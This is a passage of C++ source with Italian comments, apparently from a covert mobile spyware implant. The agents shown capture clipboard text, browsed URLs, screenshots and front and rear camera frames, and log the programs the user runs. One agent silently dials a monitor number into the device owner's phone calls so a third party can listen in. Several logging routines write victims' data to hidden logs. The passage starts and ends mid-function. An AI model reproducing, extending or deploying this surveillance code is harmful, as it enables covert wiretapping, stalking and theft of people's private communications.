	// Inizializziamo uHash con l'hash dell'ultima stringa presa
	pMarkup = log.ReadMarkup(AGENT_CLIPBOARD, &uMarkupLen);

	if (pMarkup && uMarkupLen == 4)
		CopyMemory(&uHash, pMarkup, sizeof(uHash)); 

	if (pMarkup) {
		delete[] pMarkup;
		pMarkup = NULL;
	}

	LOOP {
		do {
			hWindow = GetClipboardOwner();

			// Nessuno ha la clipboard
			if (hWindow == NULL)
				break;

			if (OpenClipboard(hWindow) == FALSE)
				break;

			iCount = CountClipboardFormats();

			if (iCount == 0) {
				CloseClipboard();
				break;
			}

			uFormat = EnumClipboardFormats(0);

			if (uFormat == 0) {
				CloseClipboard();
				break;
			}

			do {
				if (uFormat != CF_UNICODETEXT)
					continue;

				hData = GetClipboardData(CF_UNICODETEXT);
				pBuffer = (BYTE *)GlobalLock(hData);

				if (pBuffer) {
					strText = (WCHAR *)pBuffer;

					// Calcoliamone l'hash
					uNewHash = FnvHash(pBuffer, strText.size() * sizeof(WCHAR));

					GlobalUnlock(hData);

					// Se e' un nuovo dato logghiamolo
					if (uNewHash != uHash && strText != strOld) {
						WCHAR wNull = 0;
						HWND hParent;
						DWORD dwProcId;
						SYSTEMTIME st;
						struct tm mytm;
						wstring strProcName;

						// Scriviamo la data di acquisizione nel log
						GetSystemTime(&st);
						SET_TIMESTAMP(mytm, st);

						if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
							bEmpty = FALSE;

						// Troviamo l'HWND della parent window
						hParent = hWindow;

						while (GetParent(hParent))
							hParent = GetParent(hParent);

						// Scriviamo il nome del processo nel log
						GetWindowThreadProcessId(hParent, &dwProcId);
						
						if (GetProcessName(dwProcId, strProcName) == FALSE)
							strProcName = L"UNKNOWN";

						log.WriteLog((BYTE *)strProcName.c_str(), strProcName.size() * sizeof(WCHAR));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// Scriviamo il nome della finestra nel log
						if (GetWindowText(hParent, wTitle, MAX_TITLE_LEN) == 0) 
							wcscpy_s(wTitle, MAX_TITLE_LEN, L"UNKNOWN");

						log.WriteLog((BYTE *)&wTitle, (wcslen(wTitle) + 1) * sizeof(WCHAR));

						// Scriviamo i dati della clipboard nel log
						log.WriteLog((BYTE *)strText.c_str(), strText.size() * sizeof(WCHAR));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// Scriviamo il delimiter nel log
						UINT delimiter = LOG_DELIMITER;
						log.WriteLog((BYTE *)&delimiter, sizeof(delimiter));

						// Scriviamo l'hash della stringa attuale nel markup
						uHash = FnvHash((PBYTE)strText.c_str(), strText.size() * sizeof(WCHAR));
						log.WriteMarkup(AGENT_CLIPBOARD, (PBYTE)&uHash, sizeof(uHash));
					}
				}
			} while (uFormat = EnumClipboardFormats(uFormat));

			strOld = strText;

			CloseClipboard();

		} while(0);

		if (AgentSleep(MyID, 3 * 1000)) {
			log.CloseLog(bEmpty);
			
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - ClipBoardAgent clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadAgentStopped(MyID);
	return 0;
}

DWORD WINAPI UrlAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_URL);
	wstring strIEUrl, strIE65Url, strOperaUrl, strIEOld, strIE65Old, strOperaOld;
	wstring strTitle;
	BOOL bEmpty = TRUE;
	INT iRet;
	UINT uMarkupLen, uHash = 0, uNewHash;
	BYTE *pMarkup;
	SYSTEMTIME st;
	DWORD dw, dwMarker = LOG_URL_MARKER;
	WCHAR wNull = 0;
	struct tm mytm;

	Log log;

	if (lpParam == NULL || statusObj == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - UrlAgent started\n", 5, FALSE);

	if (log.CreateLog(LOGTYPE_URL, NULL, 0, FLASH) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo uHash con l'hash dell'ultimo URL preso
	pMarkup = log.ReadMarkup(AGENT_URL, &uMarkupLen);

	if (pMarkup && uMarkupLen == 4)
		CopyMemory(&uHash, pMarkup, sizeof(uHash)); 

	if (pMarkup) {
		delete[] pMarkup;
		pMarkup = NULL;
	}

	LOOP {
		do {
			iRet = GetIE60Url(strIEUrl, strTitle, MyID);

			// Calcoliamo l'hash dell'URL attuale
			uNewHash = FnvHash((PBYTE)strIEUrl.c_str(), strIEUrl.size() * sizeof(WCHAR));

			// Dobbiamo fermarci
			if (iRet < 0) {
				log.CloseLog(bEmpty);

				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - UrlAgent clean stop [0]\n", 5, FALSE);
				return TRUE;
			}

			if (iRet && uNewHash != uHash && strIEUrl != strIEOld) {
				GetSystemTime(&st);
				SET_TIMESTAMP(mytm, st);

				if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
					bEmpty = FALSE;

				log.WriteLog((BYTE *)&dwMarker, sizeof(dwMarker));
				log.WriteLog((BYTE *)strIEUrl.c_str(), strIEUrl.size() * sizeof(WCHAR));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL
				// Scriviamo il tipo di browser
				dw = 1; // IE
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo il titolo della finestra + NULL
				if (strTitle.empty())
					strTitle = L"UNKNOWN";

				log.WriteLog((BYTE *)strTitle.c_str(), WideLen((PWCHAR)strTitle.c_str()));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il delimitatore
				dw = LOG_DELIMITER;
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo l'hash dell'URL attuale nel markup
				uHash = FnvHash((PBYTE)strIEUrl.c_str(), strIEUrl.size() * sizeof(WCHAR));
				log.WriteMarkup(AGENT_URL, (PBYTE)&uHash, sizeof(uHash));

				strIEOld = strIEUrl;
			}
		} while(0);

		do {
			iRet = GetIE65Url(strIE65Url, strTitle, MyID);

			// Calcoliamo l'hash dell'URL attuale
			uNewHash = FnvHash((PBYTE)strIE65Url.c_str(), strIE65Url.size() * sizeof(WCHAR));

			// Dobbiamo fermarci
			if (iRet < 0) {
				log.CloseLog(bEmpty);

				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - UrlAgent clean stop [0]\n", 5, FALSE);
				return TRUE;
			}

			if (iRet && uNewHash != uHash && strIE65Url != strIE65Old) {
				GetSystemTime(&st);
				SET_TIMESTAMP(mytm, st);

				if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
					bEmpty = FALSE;

				log.WriteLog((BYTE *)&dwMarker, sizeof(dwMarker));
				log.WriteLog((BYTE *)strIE65Url.c_str(), strIE65Url.size() * sizeof(WCHAR));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il tipo di browser
				dw = 1; // IE
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo il titolo della finestra + NULL
				if (strTitle.empty())
					strTitle = L"UNKNOWN";

				log.WriteLog((BYTE *)strTitle.c_str(), WideLen((PWCHAR)strTitle.c_str()));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il delimitatore
				dw = LOG_DELIMITER;
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo l'hash dell'URL attuale nel markup
				uHash = FnvHash((PBYTE)strIE65Url.c_str(), strIE65Url.size() * sizeof(WCHAR));
				log.WriteMarkup(AGENT_URL, (PBYTE)&uHash, sizeof(uHash));

				strIE65Old = strIE65Url;
			}
		} while(0);

		do {
			iRet = GetOperaUrl(strOperaUrl, strTitle, MyID);

			// Calcoliamo l'hash dell'URL attuale
			uNewHash = FnvHash((PBYTE)strOperaUrl.c_str(), strOperaUrl.size() * sizeof(WCHAR));

			// Dobbiamo fermarci
			if (iRet < 0) {
				log.CloseLog(bEmpty);

				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - UrlAgent clean stop [0]\n", 5, FALSE);
				return TRUE;
			}

			if (iRet && uNewHash != uHash && strOperaUrl != strOperaOld) {
				GetSystemTime(&st);
				SET_TIMESTAMP(mytm, st);

				if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
					bEmpty = FALSE;

				log.WriteLog((BYTE *)&dwMarker, sizeof(dwMarker));
				log.WriteLog((BYTE *)strOperaUrl.c_str(), strOperaUrl.size() * sizeof(WCHAR));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il tipo di browser
				dw = 3; // Opera-Mobile
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo il titolo della finestra + NULL
				if (strTitle.empty())
					strTitle = L"UNKNOWN";

				log.WriteLog((BYTE *)strTitle.c_str(), WideLen((PWCHAR)strTitle.c_str()));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il delimitatore
				dw = LOG_DELIMITER;
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo l'hash dell'URL attuale nel markup
				uHash = FnvHash((PBYTE)strOperaUrl.c_str(), strOperaUrl.size() * sizeof(WCHAR));
				log.WriteMarkup(AGENT_URL, (PBYTE)&uHash, sizeof(uHash));

				strOperaOld = strOperaUrl;
			}
		} while(0);

		if (AgentSleep(MyID, 5 * 1000)) {
			log.CloseLog(bEmpty);
			
			// Fermiamo l'agente
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - UrlAgent clean stop [2]\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadAgentStopped(MyID);
	return TRUE;
}

DWORD WINAPI CrisisAgent(LPVOID lpParam) {
	// Queste strutture dati vanno copiate e incollate in ogni agente
	AGENT_COMMON_DATA(AGENT_CRISIS);
	// Fine delle strutture dati obbligatorie
	UINT uCrisisType;
	Log logInfo;

	if (statusObj == NULL || lpParam == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	if (MyData->uParamLength < sizeof(UINT)) {
		// Per retrocompatibilita'
		uCrisisType = CRISIS_ALL;
	} else {
		CopyMemory(&uCrisisType, MyData->pParams, sizeof(uCrisisType));
	}

	// Comunichiamo al mondo che siamo vivi
	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - CallAgent started\n", 5, FALSE);

	// Comunichiamo al sistema lo stato di crisi
	statusObj->StartCrisis(uCrisisType);
	logInfo.WriteLogInfo(L"Crisis started");

	// Attendiamo che la crisi finisca
	LOOP {
		if (AgentSleep(MyID, 10000) == FALSE)
			continue;

		statusObj->StopCrisis();
		logInfo.WriteLogInfo(L"Crisis stopped");

		statusObj->ThreadAgentStopped(MyID);
		DBG_TRACE(L"Debug - Agents.cpp - CrisisAgent clean stop\n", 5, FALSE);
		return TRUE;
	}

	statusObj->ThreadAgentStopped(MyID);
	return 0;
}

DWORD WINAPI CallAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_CALL);
	HLINEAPP hLineApp;
	HRESULT result, dwRequestId;
	HLINE hLineOpened = NULL;
	DWORD dwPhoneNumDevs = 0, dwLineNumDevs = 0, dwApiVersion = 0x00030000;
	LINEINITIALIZEEXPARAMS liep;
	LINEMESSAGE lineMess;
	UINT uNumLen, i;
	wstring strNum;

	if (lpParam == NULL || statusObj == NULL || MyData->uParamLength < sizeof(UINT)) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo i parametri
	CopyMemory(&uNumLen, MyData->pParams, sizeof(uNumLen));
	strNum = (PWCHAR)((PBYTE)(MyData->pParams) + sizeof(uNumLen));

	if (strNum.empty() || strNum.length() < 5) {
		DBG_TRACE(L"Debug - Agents.cpp - CallAgent monitor number not set\n", 5, FALSE);
		return TRUE;
	}

	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - CallAgent started\n", 5, FALSE);

	LOOP {
		ZeroMemory(&liep, sizeof(liep));
		liep.dwTotalSize = sizeof(LINEINITIALIZEEXPARAMS);
		liep.dwOptions   = LINEINITIALIZEEXOPTION_USEEVENT;

		result = lineInitializeEx(&hLineApp, 0, lineCallbackFunc, TEXT("ExTapi_Lib"), &dwPhoneNumDevs, &dwApiVersion, &liep);

		if (result < 0) {
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [0]\n", 5, FALSE);
			return 0;
		}

		for (i = 0; i < dwPhoneNumDevs; i++) {
			LINEEXTENSIONID extensionID;
			ZeroMemory(&extensionID, sizeof(LINEEXTENSIONID));

			result = lineNegotiateAPIVersion(hLineApp, i, 0x00014000, 0x00030000, &dwApiVersion, &extensionID);
		}

		DWORD extVersion = 0;
		LINECALLPARAMS lineCallParams;
		HCALL hCall = NULL, hConfCall = NULL, hListenerCall = NULL;

		ZeroMemory(&lineCallParams, sizeof(lineCallParams));
		lineCallParams.dwTotalSize = sizeof(lineCallParams);
		lineCallParams.dwBearerMode = LINEBEARERMODE_VOICE;
		lineCallParams.dwAddressMode = LINEADDRESSMODE_DIALABLEADDR;
		lineCallParams.dwCallParamFlags = LINECALLPARAMFLAGS_IDLE;
		lineCallParams.dwMediaMode = 0;

		result = lineOpen(hLineApp, 0, &hLineOpened, dwApiVersion, 0, 0x100,
			LINECALLPRIVILEGE_MONITOR | LINECALLPRIVILEGE_OWNER, LINEMEDIAMODE_INTERACTIVEVOICE /*| LINEMEDIAMODE_DATAMODEM*/, &lineCallParams);

		if (result < 0) {
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [1]\n", 5, FALSE);
			return 0;
		}

		// Attendiamo che arrivi o sia effettuata una chiamata
		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (statusObj->AgentQueryStop(MyID) == FALSE)
					continue;

				lineShutdown(hLineApp);
				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - CallAgent clean stop\n", 5, FALSE);
				return TRUE;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE) && lineMess.dwMessageID == LINE_CALLSTATE &&
				lineMess.dwParam1 == LINECALLSTATE_CONNECTED) {

				hCall = (HCALL)lineMess.hDevice; // Prendiamo l'handle della chiamata!
				break;
			}
		}

		// Prendiamo i privilegi sulla chiamata
		result = lineSetCallPrivilege(hCall, LINECALLPRIVILEGE_OWNER);

		if (result < 0) {
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [2]\n", 5, FALSE);
			continue;
		}

		// XXX Su alcuni cell hCall DEVE essere NULL e il secondo parametro valorizzato
		// LONG lRet = lineSetupConference(hCall, NULL, &hConfCall, &hListenerCall, 3, (const LPLINECALLPARAMS)plineParams);
		LONG lRet = lineSetupConference(hCall, NULL, &hConfCall, &hListenerCall, 3, NULL);

		if (lRet < 0) {
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [3]\n", 5, FALSE);
			continue;
		}

		// Attendiamo che la lineSetupConference ci comunichi il suo stato
		BOOL bReply, bConferenced, bDial, bOnHold;
		bReply = bConferenced = bDial = bOnHold = FALSE;

		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (statusObj->AgentQueryStop(MyID) == FALSE)
					continue;

				lineShutdown(hLineApp);
				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - CallAgent clean stop\n", 5, FALSE);
				return TRUE;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_REPLY) {
					if (lineMess.dwParam2 == 0)
						bReply = TRUE;
					else
						return 0; // XXX Non dobbiamo continuare in questo caso
				}

				if (lineMess.hDevice == (DWORD)hCall && lineMess.dwParam1 == LINECALLSTATE_CONFERENCED)
					bConferenced = TRUE;

				if (lineMess.hDevice == (DWORD)hListenerCall && lineMess.dwParam1 == LINECALLSTATE_DIALTONE)
					bDial = TRUE;

				if (lineMess.hDevice == (DWORD)hConfCall && lineMess.dwParam1 == LINECALLSTATE_ONHOLDPENDCONF)
					bOnHold = TRUE;
			}

			if (bReply && bConferenced && bDial && bOnHold)
				break;
		}

		dwRequestId = lineDial(hListenerCall, strNum.c_str(), 0);

		if (dwRequestId < 0) {
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [4]\n", 5, FALSE);
			continue;
		}

		// Attendiamo che la terza parte risponda
		BOOL bTerminated = FALSE;
		bReply = bConferenced = FALSE;

		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (statusObj->AgentQueryStop(MyID) == FALSE)
					continue;

				lineShutdown(hLineApp);
				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - CallAgent clean stop\n", 5, FALSE);
				return TRUE;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_REPLY)
					bReply = TRUE;

				if (lineMess.hDevice == (DWORD)hListenerCall && lineMess.dwParam1 == LINECALLSTATE_CONNECTED)
					bConferenced = TRUE;

				// Vediamo se nel frattempo la chiamata e' terminata
				if (lineMess.dwMessageID == LINE_CALLSTATE && lineMess.dwParam1 == LINECALLSTATE_DISCONNECTED) {
					bTerminated = TRUE;
					break;
				}
			}

			if (bReply && bConferenced)
				break;
		}

		result = lineAddToConference(hConfCall, hListenerCall);

		if (result < 0 || bTerminated) {
			lineDrop(hListenerCall, NULL, 0);
			lineShutdown(hLineApp);
			DBG_TRACE(L"Debug - Agents.cpp - CallAgent FAILED [Call not answered?] [4]\n", 5, FALSE);
			continue;
		}

		// Attendiamo che la conference call sia completa
		bReply = bConferenced = bDial = FALSE;

		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (statusObj->AgentQueryStop(MyID) == FALSE)
					continue;

				lineShutdown(hLineApp);
				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - CallAgent clean stop\n", 5, FALSE);
				return TRUE;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_REPLY)
					bReply = TRUE;

				if (lineMess.hDevice == (DWORD)hListenerCall && lineMess.dwParam1 == LINECALLSTATE_CONFERENCED)
					bConferenced = TRUE;

				if (lineMess.hDevice == (DWORD)hConfCall && lineMess.dwParam1 == LINECALLSTATE_CONNECTED)
					bDial = TRUE;
			}

			if (bReply && bConferenced && bDial)
				break;
		}

		// Attendiamo ora la fine della telefonata
		// 1. Chiude il chiamante, chiudiamo anche noi
		// 2. Chiude il chiamato, chiudiamo anche noi
		LOOP {
			if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
				if (statusObj->AgentQueryStop(MyID) == FALSE)
					continue;

				lineShutdown(hLineApp);
				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - CallAgent clean stop\n", 5, FALSE);
				return TRUE;
			}

			if (!lineGetMessage(hLineApp, &lineMess, INFINITE)) {
				if (lineMess.dwMessageID == LINE_CALLSTATE && lineMess.dwParam1 == LINECALLSTATE_DISCONNECTED) {
					lineDrop(hListenerCall, NULL, 0);
					break;
				}
			}
		}

		lineShutdown(hLineApp);
	}

	statusObj->ThreadAgentStopped(MyID);
	return 0;
}

DWORD WINAPI SnapshotAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_SNAPSHOT);
	UINT uTimeStep, uOnWindow;
	UINT uQuality = SNAPSHOT_DEFAULT_JPEG_QUALITY;
	Device* devobj = Device::self();

	if (lpParam == NULL || statusObj == NULL || devobj == NULL || MyData->uParamLength < sizeof(UINT) * 2) { 
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if (hr == S_FALSE) {
		CoUninitialize();
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	if (FAILED(hr)) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	CMSnapShot *snapshotObj = new(std::nothrow) CMSnapShot;

	if (snapshotObj == NULL) {
		CoUninitialize();
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo i parametri
	CopyMemory(&uTimeStep, MyData->pParams, sizeof(uTimeStep));
	CopyMemory(&uOnWindow, (PBYTE)(MyData->pParams) + sizeof(uTimeStep), sizeof(uOnWindow));

	if (uTimeStep < 1000)
		uTimeStep = SNAPSHOT_DEFAULT_TIMESTEP;

	// 0 -> standard capture
	// 1 -> on new window
	if (uOnWindow > 1)
		uOnWindow = 0;

	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - SnapshotAgent started\n", 5, FALSE);

	snapshotObj->SetQuality(uQuality);

	LOOP {
		if (devobj->GetFrontLightPowerState() == D0)
			snapshotObj->Run();

		if (AgentSleep(MyID, uTimeStep)) {
			delete snapshotObj;
			CoUninitialize();

			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - SnapshotAgent clean stop\n", 5, FALSE);
			return 0;
		}			
	}
	
	statusObj->ThreadAgentStopped(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - SnapshotAgent clean stop\n", 5, FALSE);
	return 0;
}

DWORD WINAPI CameraAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_CAM);

	// Fine delle strutture obbligatorie
	UINT uTimeStep, uNumStep;
	INT  iResult = 0;
	BSTR bstr1, bstr2 = NULL;
	DWORD dwModeRear = MODE_STILL, dwModeFront = MODE_CAPTURE;
	Device* devobj = Device::self();
	DeviceCam devCam;

	if (lpParam == NULL || statusObj == NULL || MyData->uParamLength < sizeof(UINT) * 2) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo i parametri
	CopyMemory(&uTimeStep, MyData->pParams, sizeof(uTimeStep));
	CopyMemory(&uNumStep, (PBYTE)(MyData->pParams) + sizeof(uTimeStep), sizeof(uNumStep));

	if (uTimeStep < 1000)
		uTimeStep = SNAPSHOT_DEFAULT_TIMESTEP;

	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);

	// CoUninitialize va chiamata se la funzione torna S_OK o S_FALSE
	if (hr == S_FALSE) {
		CoUninitialize();
		DBG_TRACE(L"Debug - Camera.cpp - CameraAgent CoUninitialize S_FALSE [0]\n", 5, FALSE);
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	if (FAILED(hr)) {
		DBG_TRACE(L"Debug - Camera.cpp - CameraAgent CoUninitialize FAILED [1]\n", 5, FALSE);
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - CameraAgent started\n", 5, FALSE);

	devCam.FindCamera(L"CAM*");
	
	devobj->DisableDrWatson();

	// Se la camera e' presente proviamo un primo scatto nella modalita' di default.
	if (devCam.IsRearCamPresent()) {
		// Set registry power status during Suspend and resume
		devCam.SetRegPowerStatus(L"CAM1:");
		devCam.SetCam1PowerState();

		bstr1 = SysAllocString(L"CAM1:");
		
		iResult = CamGrabFrame(bstr1, dwModeRear);
		DBG_TRACE_INT(L"Debug - Agents.cpp - First CamGrabFrame rear return: ", 5, FALSE, iResult);

		switch (iResult) {
			case OUT_ERROR_FILTERAUTOCONNECT:
				dwModeRear = MODE_CAPTURE;
				break;
			case OUT_ERROR_LOADCAMDRIVER:  // NB: prvare a mettere una AgentSleep invece di disabilitare la cam
				devCam.DisableRearCam();
				break;
			case OUT_ERROR_EXCEPTION:
				devCam.DisableRearCam();
				uNumStep = 0;
				break;
			default: break;
		}	

		devCam.ReleaseCam1PowerState();

	}
	// Se la camera e' presente proviamo un primo scatto nella modalita' di default.
	if (devCam.IsFrontCamPresent()) {
		// Set registry power status during Suspend and resume
		devCam.SetRegPowerStatus(L"CAM2:");
		devCam.SetCam2PowerState();
		
		bstr2 = SysAllocString(L"CAM2:");

		iResult = CamGrabFrame(bstr2, dwModeFront);
		DBG_TRACE_INT(L"Debug - Agents.cpp - First CamGrabFrame front return: ", 5, FALSE, iResult);
		
		switch (iResult) {
			case OUT_ERROR_FILTERAUTOCONNECT:
				dwModeRear = MODE_CAPTURE;
				break;

			case OUT_ERROR_LOADCAMDRIVER:   // NB: provare a mettere una AgentSleep invece di disabilitare la cam
				devCam.DisableFrontCam();
				break;

			case OUT_ERROR_EXCEPTION:
				devCam.DisableFrontCam();
				uNumStep = 0;
				break;

			default: break;
			}	
		
		devCam.ReleaseCam2PowerState();
	}

	for (UINT uCount = 0; uCount < uNumStep - 1; uCount++) {
		if ((statusObj->Crisis() & CRISIS_CAMERA) != CRISIS_CAMERA) {
			if (devCam.IsRearCamPresent()) {
				devCam.SetCam1PowerState();
				iResult = CamGrabFrame(bstr1, dwModeRear);

				if (iResult == OUT_ERROR_LOADCAMDRIVER)
					devCam.DisableRearCam();

				DBG_TRACE_INT(L"Debug - Agents.cpp - CamGrabFrame rear return: ", 5, FALSE, iResult);
				devCam.ReleaseCam1PowerState();
			}
			
			if (devCam.IsFrontCamPresent()) {
				devCam.SetCam2PowerState();
				iResult = CamGrabFrame(bstr2, dwModeFront);

				if (iResult == OUT_ERROR_LOADCAMDRIVER)
					devCam.DisableFrontCam();

				DBG_TRACE_INT(L"Debug - Agents.cpp - CamGrabFrame front return: ", 5, FALSE, iResult);
				devCam.ReleaseCam2PowerState();
			}
		} else {
			uCount--;
		}
		
		if (AgentSleep(MyID, uTimeStep)) {
			if (bstr1 != NULL)
				SysFreeString(bstr1);

			if (bstr2 != NULL)
				SysFreeString(bstr2);

			devobj->EnableDrWatson();
			CoUninitialize();
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - CameraAgent clean stop\n", 5, FALSE);
			return 0;
		}
	}

	if (bstr1 != NULL)
		SysFreeString(bstr1);

	if (bstr2 != NULL)
		SysFreeString(bstr2);

	devobj->EnableDrWatson();
	CoUninitialize();
	statusObj->ThreadAgentStopped(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - CameraAgent clean stop\n", 5, FALSE);
	return 0;
}

DWORD WINAPI ApplicationAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_APPLICATION);
	Log log;
	list<ProcessEntry> pProcessList, pUpdatedProcess;
	list<ProcessEntry>::iterator iterOld, iterNew;
	Process *processObj = Process::self();
	wstring wDesc;
	struct tm mytm;
	WCHAR wNull = 0;
	SYSTEMTIME st;
	BOOL bFirst = TRUE, bFound = FALSE, bEmpty = TRUE;
	
	if (lpParam == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	pProcessList.clear();
	pUpdatedProcess.clear();

	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - ApplicationAgent started\n", 5, FALSE);

	// Creiamo il log
	if (log.CreateLog(LOGTYPE_APPLICATION, NULL, 0, FLASH) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		DBG_TRACE(L"Debug - Agents.cpp - ApplicationAgent FAILED [0]\n", 5, FALSE);
		return TRUE;
	}

	LOOP {
		do {
			if (bFirst) {
				bFirst = FALSE;
				pProcessList.clear();

				if (pUpdatedProcess.empty())
					processObj->GetProcessList(pProcessList);
				else
					pProcessList = pUpdatedProcess;
			} else {
				bFirst = TRUE;
				pUpdatedProcess.clear();
				processObj->GetProcessList(pUpdatedProcess);

				if (pUpdatedProcess.empty() || pProcessList.empty())
					continue;

				// Confronta le due liste (la nuova con la vecchia) alla ricerca di nuovi processi
				for (iterNew = pUpdatedProcess.begin(); iterNew != pUpdatedProcess.end(); iterNew++) {
					for (iterOld = pProcessList.begin(); iterOld != pProcessList.end(); iterOld++) {	
						if (!wcscmp((*iterOld).pe.szExeFile, (*iterNew).pe.szExeFile)) {
							bFound = TRUE; // Situazione invariata
							pProcessList.erase(iterOld);
							break;
						}
					}

					if (bFound == FALSE) {
						GetSystemTime(&st);
						SET_TIMESTAMP(mytm, st);

						// 1. Scriviamo il timestamp
						if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
							bEmpty = FALSE;

						// 2. Poi il nome del file
						log.WriteLog((BYTE *)(*iterNew).pe.szExeFile, WideLen((*iterNew).pe.szExeFile));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// 3. Quindi lo stato (START o STOP)
						log.WriteLog((BYTE *)L"START", WideLen(L"START"));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// 4. La descrizione (se disponibile)
						wDesc = processObj->GetProcessDescription((*iterNew).pe.th32ProcessID);

						if (wDesc.empty() == FALSE)
							log.WriteLog((BYTE *)wDesc.c_str(), wDesc.size() * sizeof(WCHAR));

						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// 5. Ed il delimitatore
						UINT delimiter = LOG_DELIMITER;
						log.WriteLog((BYTE *)&delimiter, sizeof(delimiter));
					}

					bFound = FALSE;
				}

				for (iterOld = pProcessList.begin(); iterOld != pProcessList.end(); iterOld++) {
					GetSystemTime(&st);
					SET_TIMESTAMP(mytm, st);

					// 1. Scriviamo il timestamp
